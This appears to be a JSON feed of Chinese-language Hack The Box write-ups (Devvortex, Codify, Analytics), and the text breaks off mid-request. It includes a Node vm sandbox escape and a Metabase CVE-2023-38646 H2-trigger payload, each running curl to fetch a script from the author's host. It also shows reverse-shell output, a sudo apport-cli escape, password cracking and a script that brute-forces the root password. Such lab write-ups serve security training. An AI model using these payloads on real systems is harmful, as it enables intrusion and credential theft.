class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root:x:0:0:root:/root:/bin/bash</span><br><span class=\"line\">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class=\"line\">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class=\"line\">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class=\"line\">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class=\"line\">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class=\"line\">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class=\"line\">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class=\"line\">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class=\"line\">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class=\"line\">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class=\"line\">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class=\"line\">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class=\"line\">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class=\"line\">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class=\"line\">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class=\"line\">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class=\"line\">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class=\"line\">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class=\"line\">systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class=\"line\">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">syslog:x:104:110::/home/syslog:/usr/sbin/nologin</span><br><span class=\"line\">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false</span><br><span class=\"line\">uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin</span><br><span class=\"line\">tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin</span><br><span class=\"line\">pollinate:x:110:1::/var/cache/pollinate:/bin/false</span><br><span class=\"line\">sshd:x:111:65534::/run/sshd:/usr/sbin/nologin</span><br><span class=\"line\">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class=\"line\">lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false</span><br><span class=\"line\">usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class=\"line\">fwupd-refresh:x:113:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin</span><br><span class=\"line\">mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class=\"line\">logan:x:1000:1000:,,,:/home/logan:/bin/bash</span><br><span class=\"line\">_laurel:x:997:997::/var/log/laurel:/bin/false</span><br></pre></td></tr></table></figure></p>\n<p>查看到有 /bin/bash 的用户有</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root:x:0:0:root:/root:/bin/bash</span><br><span class=\"line\">logan:x:1000:1000:,,,:/home/logan:/bin/bash</span><br></pre></td></tr></table></figure></p>\n<p>现在我们的目标就是 logan</p>\n<p>然后通过一开始获得的账号密码登录 mysql</p>\n<p>在 select * from sd4fg_user 得到 logan 的密码串，然后通过 john 进行解密</p>\n<p>得到了 logan 密码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">爆破出密码是tequieromucho</span><br></pre></td></tr></table></figure></p>\n<p>获取到 logan 的密码后登录</p>\n<p>提交 user.txt</p>\n<h4 id=\"提权\"><a class=\"anchor\" href=\"#提权\">#</a> 提权</h4>\n<p>然后 sudo -l</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">logan@devvortex:~$ sudo -l</span><br><span class=\"line\">Matching Defaults entries for logan on devvortex:</span><br><span class=\"line\">    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin</span><br><span class=\"line\"></span><br><span class=\"line\">User logan may run the following commands on devvortex:</span><br><span class=\"line\">    (ALL : ALL) /usr/bin/apport-cli</span><br></pre></td></tr></table></figure></p>\n<p>通过</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo /usr/bin/apport-cli -c test.log less</span><br><span class=\"line\">V</span><br><span class=\"line\">!/bin/bash</span><br></pre></td></tr></table></figure></p>\n<p>获取到 root 权限</p>\n",
            "tags": [
                "渗透"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-Codify/",
            "url": "https://lookhui.github.io/HTB-Codify/",
            "title": "HTB-Codify",
            "date_published": "2023-12-14T06:52:58.000Z",
            "content_html": "<h1 id=\"codify\"><a class=\"anchor\" href=\"#codify\">#</a> Codify</h1>\n<h4 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h4>\n<p>nmap 扫描 ip 并且浏览器访问 ip</p>\n<p>加上 hosts</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10.10.11.239 codify.htb</span><br></pre></td></tr></table></figure></p>\n<p>nmap 扫描出打开了 3 个端口</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-14 14:56 中国标准时间</span><br><span class=\"line\">Nmap scan report for codify.htb (10.10.11.239)</span><br><span class=\"line\">Host is up (0.33s latency).</span><br><span class=\"line\">Not shown: 997 closed tcp ports (reset)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">22/tcp   open  ssh</span><br><span class=\"line\">80/tcp   open  http</span><br><span class=\"line\">3000/tcp open  ppp</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 62.45 seconds</span><br></pre></td></tr></table></figure></p>\n<p>3000 和 80 都是一样的 web 界面我们直接在 js 上执行命令</p>\n<h4 id=\"反弹shell\"><a class=\"anchor\" href=\"#反弹shell\">#</a> 反弹 shell</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const vm = require(&#x27;vm&#x27;);</span><br><span class=\"line\">const script = `</span><br><span class=\"line\">const process = this.toString.constructor(&#x27;return process&#x27;)()</span><br><span class=\"line\">process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;curl -o /tmp/2.sh http://10.10.14.54/2.sh&#x27;).toString()</span><br><span class=\"line\">`;</span><br><span class=\"line\">const sandbox = &#123; m: 1, n: 2 &#125;;</span><br><span class=\"line\">const context = new vm.createContext(sandbox);</span><br><span class=\"line\">const res = vm.runInContext(script, context);</span><br><span class=\"line\">console.log(res)</span><br></pre></td></tr></table></figure></p>\n<p>我一开始想直接执行反弹 shell 但是失败现在下载试试</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">listening on [any] 9999 ...</span><br><span class=\"line\">connect to [10.10.14.54] from (UNKNOWN) [10.10.11.239] 56918</span><br><span class=\"line\">bash: cannot set terminal process group (1257): Inappropriate ioctl for device</span><br><span class=\"line\">bash: no job control in this shell</span><br><span class=\"line\">svc@codify:~$ ls</span><br><span class=\"line\">ls</span><br></pre></td></tr></table></figure></p>\n<p>成功反弹</p>\n<p>开始找第一个 flag</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查看home文件下面的内容发现有两个文件</span><br><span class=\"line\">svc@codify:/home$ ls /home</span><br><span class=\"line\">ls /home</span><br><span class=\"line\">joshua</span><br><span class=\"line\">svc</span><br></pre></td></tr></table></figure></p>\n<p>可能 flag 就在这个 joshua 里面</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">svc@codify:/var/www/contact$ cat tickets.db</span><br><span class=\"line\">cat tickets.db</span><br><span class=\"line\">?T5??T?tableticketsticketsCREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)??tableusersusersCREATE TABLE users (</span><br><span class=\"line\">        id INTEGER PRIMARY KEY AUTOINCREMENT,</span><br><span class=\"line\">        username TEXT UNIQUE,</span><br><span class=\"line\">        password TEXT</span><br><span class=\"line\">??G?joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2</span><br><span class=\"line\">??</span><br><span class=\"line\">????ua  users</span><br><span class=\"line\">ickets</span><br><span class=\"line\">r]r乭%%?Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.open?;亀Tom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!open</span><br></pre></td></tr></table></figure></p>\n<p>在这个 var/www/contact 里面发现了 joshua 的信息</p>\n<p>还有他的密码串我们使用 john 来进行解码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">└─$ john 1.txt</span><br><span class=\"line\">Using default input encoding: UTF-8</span><br><span class=\"line\">Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])</span><br><span class=\"line\">Cost 1 (iteration count) is 4096 for all loaded hashes</span><br><span class=\"line\">Will run 16 OpenMP threads</span><br><span class=\"line\">Proceeding with single, rules:Single</span><br><span class=\"line\">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class=\"line\">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class=\"line\">Proceeding with wordlist:/usr/share/john/password.lst</span><br></pre></td></tr></table></figure></p>\n<p>解了 2 分钟就得到密码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">└─$ john 1.txt</span><br><span class=\"line\">Using default input encoding: UTF-8</span><br><span class=\"line\">Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])</span><br><span class=\"line\">Cost 1 (iteration count) is 4096 for all loaded hashes</span><br><span class=\"line\">Will run 16 OpenMP threads</span><br><span class=\"line\">Proceeding with single, rules:Single</span><br><span class=\"line\">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class=\"line\">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class=\"line\">Proceeding with wordlist:/usr/share/john/password.lst</span><br><span class=\"line\">spongebob1       (?)</span><br><span class=\"line\">1g 0:00:01:50 DONE 2/3 (2023-12-14 15:18) 0.009071g/s 108.4p/s 108.4c/s 108.4C/s steph1..gatita1</span><br><span class=\"line\">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class=\"line\">Session completed.</span><br></pre></td></tr></table></figure></p>\n<p>使用 ssh 连接</p>\n<p>flag1 就在目录下</p>\n<h4 id=\"提权\"><a class=\"anchor\" href=\"#提权\">#</a> 提权</h4>\n<p>使用 sudo -l</p>\n<p>输入密码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[sudo] password for joshua:</span><br><span class=\"line\">Matching Defaults entries for joshua on codify:</span><br><span class=\"line\">    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,</span><br><span class=\"line\">    use_pty</span><br><span class=\"line\"></span><br><span class=\"line\">User joshua may run the following commands on codify:</span><br><span class=\"line\">    (root) /opt/scripts/mysql-backup.sh</span><br></pre></td></tr></table></figure></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1teXNxbC1iYWNrdXAtdnoweG40NWEuc2g=\">打开 mysql-backup.sh</span></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">DB_USER=&quot;root&quot;</span><br><span class=\"line\">DB_PASS=$(/usr/bin/cat /root/.creds)</span><br><span class=\"line\">BACKUP_DIR=&quot;/var/backups/mysql&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">read -s -p &quot;Enter MySQL password for $DB_USER: &quot; USER_PASS</span><br><span class=\"line\">/usr/bin/echo</span><br><span class=\"line\"></span><br><span class=\"line\">if [[ $DB_PASS == $USER_PASS ]]; then</span><br><span class=\"line\">        /usr/bin/echo &quot;Password confirmed!&quot;</span><br><span class=\"line\">else</span><br><span class=\"line\">        /usr/bin/echo &quot;Password confirmation failed!&quot;</span><br><span class=\"line\">        exit 1</span><br><span class=\"line\">fi</span><br><span class=\"line\"></span><br><span class=\"line\">/usr/bin/mkdir -p &quot;$BACKUP_DIR&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">databases=$(/usr/bin/mysql -u &quot;$DB_USER&quot; -h 0.0.0.0 -P 3306 -p&quot;$DB_PASS&quot; -e &quot;SHOW DATABASES;&quot; | /usr/bin/grep -Ev &quot;(Database|information_schema|performance_schema)&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">for db in $databases; do</span><br><span class=\"line\">    /usr/bin/echo &quot;Backing up database: $db&quot;</span><br><span class=\"line\">    /usr/bin/mysqldump --force -u &quot;$DB_USER&quot; -h 0.0.0.0 -P 3306 -p&quot;$DB_PASS&quot; &quot;$db&quot; | /usr/bin/gzip &gt; &quot;$BACKUP_DIR/$db.sql.gz&quot;</span><br><span class=\"line\">done</span><br><span class=\"line\"></span><br><span class=\"line\">/usr/bin/echo &quot;All databases backed up successfully!&quot;</span><br><span class=\"line\">/usr/bin/echo &quot;Changing the permissions&quot;</span><br><span class=\"line\">/usr/bin/chown root:sys-adm &quot;$BACKUP_DIR&quot;</span><br><span class=\"line\">/usr/bin/chmod 774 -R &quot;$BACKUP_DIR&quot;</span><br><span class=\"line\">/usr/bin/echo &#x27;Done!&#x27;</span><br></pre></td></tr></table></figure></p>\n<p>这里的话使用脚本</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import subprocess</span><br><span class=\"line\">import string</span><br><span class=\"line\">def run_command(command):</span><br><span class=\"line\">    output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode()</span><br><span class=\"line\">    return output</span><br><span class=\"line\"></span><br><span class=\"line\">dic=string.ascii_letters+string.digits</span><br><span class=\"line\">password=&quot;&quot;</span><br><span class=\"line\">for i in range(100):</span><br><span class=\"line\">    for i in dic:</span><br><span class=\"line\">        output= run_command(f&#x27;echo &quot;&#123;password&#125;&#123;i&#125;*&quot; | sudo /opt/scripts/mysql-backup.sh&#x27;)</span><br><span class=\"line\">        if &quot;Password confirmed&quot; in output:</span><br><span class=\"line\">            password+=i</span><br><span class=\"line\">            print(password)</span><br><span class=\"line\">            break</span><br></pre></td></tr></table></figure></p>\n<p>得到 root 密码</p>\n<p>得到密码后不要使用 ssh 连接直接使用 su root 即可</p>\n",
            "tags": [
                "渗透"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-Analytics/",
            "url": "https://lookhui.github.io/HTB-Analytics/",
            "title": "HTB-Analytics",
            "date_published": "2023-12-14T04:54:18.000Z",
            "content_html": "<h1 id=\"analytics\"><a class=\"anchor\" href=\"#analytics\">#</a> Analytics</h1>\n<h4 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h4>\n<p>nmap 扫描同时 http 访问</p>\n<p>换上 hosts</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10.10.11.233 analytical.htb</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-14 12:55 中国标准时间</span><br><span class=\"line\">Nmap scan report for bogon (10.10.11.233)</span><br><span class=\"line\">Host is up (0.33s latency).</span><br><span class=\"line\">Not shown: 998 closed tcp ports (reset)</span><br><span class=\"line\">PORT   STATE SERVICE</span><br><span class=\"line\">22/tcp open  ssh</span><br><span class=\"line\">80/tcp open  http</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 50.99 seconds</span><br></pre></td></tr></table></figure></p>\n<p>hosts 换好后进行目录扫描</p>\n<p>查看主页面有一个登录 login 进去后发现域名是</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://data.analytical.htb/</span><br></pre></td></tr></table></figure></p>\n<p>把 hosts 添加上</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10.10.11.233 data.analytical.htb</span><br></pre></td></tr></table></figure></p>\n<p>查看到 cookie 是 metabase 服务</p>\n<p>可以试试</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Metabase 远程代码执行漏洞(CVE-2023-38646)</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"反弹shell\"><a class=\"anchor\" href=\"#反弹shell\">#</a> 反弹 shell</h4>\n<p>首先访问</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://data.analytical.htb/api/session/properties</span><br></pre></td></tr></table></figure></p>\n<p>得到 token</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;setup-token&quot;: &quot;249fa03d-fd94-4d5b-b94f-b4ebf3df681f&quot;,</span><br></pre></td></tr></table></figure></p>\n<p>在访问</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://data.analytical.htb/api/setup/validate</span><br></pre></td></tr></table></figure></p>\n<p>构造 exp</p>\n<p>在本地执行 python -m http.server 80</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS0yLXpuNmE5YjlkcjByNWl4ODBmLnNo\">并且写入一个 2.sh</span></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /api/setup/validate HTTP/1.1</span><br><span class=\"line\">Host: data.analytical.htb</span><br><span class=\"line\">Content-Type:application/json</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Cookie: metabase.DEVICE=17645f70-ae73-4c86-a81c-ab6fdaa2ccf7</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Length: 741</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;token&quot;: &quot;249fa03d-fd94-4d5b-b94f-b4ebf3df681f&quot;,</span><br><span class=\"line\">    &quot;details&quot;:</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        &quot;is_on_demand&quot;: false,</span><br><span class=\"line\">        &quot;is_full_sync&quot;: false,</span><br><span class=\"line\">        &quot;is_sample&quot;: false,</span><br><span class=\"line\">        &quot;cache_ttl&quot;: null,</span><br><span class=\"line\">        &quot;refingerprint&quot;: false,</span><br><span class=\"line\">        &quot;auto_run_queries&quot;: true,</span><br><span class=\"line\">        &quot;schedules&quot;:</span><br><span class=\"line\">        &#123;&#125;,</span><br><span class=\"line\">        &quot;details&quot;:</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;db&quot;: &quot;zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\njava.lang.Runtime.getRuntime().exec(&#x27;curl -o /tmp/2.sh http://10.10.14.54/2.sh&#x27;)\\n$$--=x&quot;,</span><br><span class=\"line\">            &quot;advanced-options&quot;: false,</span><br><span class=\"line\">            &quot;ssl&quot;: true</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &quot;name&quot;: &quot;an-sec-research-team&quot;,</span><br><span class=\"line\">        &quot;engine&quot;: &quot;h2&quot;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>通过 curl 得到 2.sh 并且放在 tmp 文件夹下</p>\n<p>在使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /api/setup/validate HTTP/1.1</span><br><span class=\"line\">Host: data.analytical.htb</span><br><span class=\"line\">Content-Type:application/json</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Cookie: metabase.DEVICE=17645f70-ae73-4c86-a81c-ab6fdaa2ccf7</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Length: 741</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;token&quot;: &quot;249fa03d-fd94-4d5b-b94f-b4ebf3df681f&quot;,</span><br><span class=\"line\">    &quot;details&quot;:</span><br><span class=\"line\">    